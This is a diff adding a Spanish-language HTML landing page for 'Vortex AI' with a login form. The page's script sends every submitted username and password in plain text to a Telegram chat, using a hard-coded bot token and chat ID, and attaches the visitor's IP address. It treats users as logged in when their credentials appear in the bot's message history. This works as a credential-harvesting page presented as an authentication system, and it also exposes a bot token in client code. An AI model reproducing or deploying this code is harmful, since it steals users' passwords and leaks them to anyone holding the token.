@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vortex AI⎊ - Sistema Real</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0c0c0c, #1a1a2e, #16213e);
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        header {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 1rem 2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #7e22ce, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero {
+            padding: 4rem 0;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(45deg, #7e22ce, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .cta-button {
+            background: linear-gradient(45deg, #7e22ce, #3b82f6);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin: 10px;
+            transition: transform 0.3s ease;
+        }
+
+        .cta-button:hover {
+            transform: scale(1.05);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(20px);
+            padding: 3rem;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .alert {
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 1rem;
+            display: none;
+        }
+
+        .alert.success {
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid #22c55e;
+            display: block;
+        }
+
+        .alert.error {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid #ef4444;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">Vortex AI⎊</div>
+    </header>
+
+    <div class="container">
+        <section class="hero">
+            <h1>Vortex AI⎊</h1>
+            <p style="font-size: 1.2rem; margin-bottom: 2rem;">Sistema de autenticación REAL con Telegram API</p>
+            <button class="cta-button" onclick="openModal()">🔐 Acceso con Telegram</button>
+        </section>
+    </div>
+
+    <!-- Modal Login -->
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <h2 style="margin-bottom: 2rem;">🌀 Acceso Vortex AI</h2>
+            
+            <div id="alertMessage" class="alert"></div>
+            
+            <form onsubmit="handleLogin(event)">
+                <div class="form-group">
+                    <label>👤 Usuario:</label>
+                    <input type="text" id="username" required placeholder="Tu usuario">
+                </div>
+                <div class="form-group">
+                    <label>🔑 Contraseña:</label>
+                    <input type="password" id="password" required placeholder="Tu contraseña">
+                </div>
+                <button type="submit" class="cta-button" style="width: 100%; margin-top: 1rem;">
+                    🚀 Iniciar Sesión
+                </button>
+            </form>
+            
+            <div style="margin-top: 1.5rem; font-size: 0.9rem; opacity: 0.8;">
+                🔐 Credenciales se envían a Telegram para verificación
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuración Telegram - USA TUS DATOS REALES
+        const BOT_TOKEN = "8120164090:AAHkYn_CsETLSlP3Jzp-eEWbS5G9NGRBUwY";
+        const CHAT_ID = "-1003059908452";
+
+        // Función para enviar mensaje a Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        // Función para leer mensajes de Telegram y verificar login
+        async function verifyLogin(username, password) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-100`;
+            
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                
+                if (!data.ok) return false;
+
+                // Buscar en los últimos mensajes
+                for (let update of data.result) {
+                    if (update.message && update.message.text) {
+                        const text = update.message.text;
+                        const userMatch = `Usuario: <code>${username}</code>`;
+                        const passMatch = `Password: <code>${password}</code>`;
+                        
+                        if (text.includes(userMatch) && text.includes(passMatch)) {
+                            return true;
+                        }
+                    }
+                }
+                return false;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        // Manejar login
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username || !password) {
+                showAlert('❌ Usuario y contraseña requeridos', 'error');
+                return;
+            }
+
+            showAlert('⏳ Verificando credenciales en Telegram...', 'success');
+
+            // PRIMERO: Verificar si el usuario ya existe
+            const userExists = await verifyLogin(username, password);
+            
+            if (userExists) {
+                // Usuario encontrado - LOGIN EXITOSO
+                showAlert('✅ ¡Login exitoso! Bienvenido a Vortex AI.', 'success');
+                localStorage.setItem('vortex_user', username);
+                setTimeout(() => {
+                    window.location.href = 'dashboard.html';
+                }, 2000);
+            } else {
+                // Usuario NO existe - ENVIAR REGISTRO
+                const message = `🆕 NUEVO REGISTRO VORTEX AI\n👤 Usuario: <code>${username}</code>\n🔑 Password: <code>${password}</code>\n⏰ Fecha: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}`;
+                
+                const sent = await sendToTelegram(message);
+                
+                if (sent) {
+                    showAlert('✅ Registro enviado! Ahora puedes iniciar sesión.', 'success');
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                } else {
+                    showAlert('❌ Error al registrar. Intenta nuevamente.', 'error');
+                }
+            }
+        }
+
+        // Funciones auxiliares
+        function openModal() {
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('loginModal').style.display = 'none';
+        }
+
+        function showAlert(message, type) {
+            const alert = document.getElementById('alertMessage');
+            alert.textContent = message;
+            alert.className = `alert ${type}`;
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Desconocida';
+            }
+        }
+
+        // Cerrar modal al hacer click fuera
+        window.onclick = function(event) {
+            const modal = document.getElementById('loginModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+    </script>
+</body>
+</html>
